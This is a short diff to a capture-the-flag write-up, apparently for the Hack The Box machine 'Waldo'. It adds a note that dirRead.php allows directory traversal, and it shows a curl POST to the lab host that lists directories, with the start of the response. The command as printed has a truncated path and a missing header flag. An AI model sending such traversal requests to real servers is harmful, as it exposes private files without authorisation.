@@ -66,7 +66,8 @@ By inspecting with chrome development tool, we can find that it is html web page
 
 In that file, there are some interesting php path in some functions.
 
-For instance, dirRead.php has Directory Traversal.
+For instance, dirRead.php has Directory Traversal.<br>
+Which means we can see any directory on Waldo.
 {% highlight shell %}
 root@kali:~# curl -i -X POST http://10.10.10.87/dirRead.p "Content-Type: application/x-www-form-urlencoded" -d "path=./" 
 HTTP/1.1 200 OK
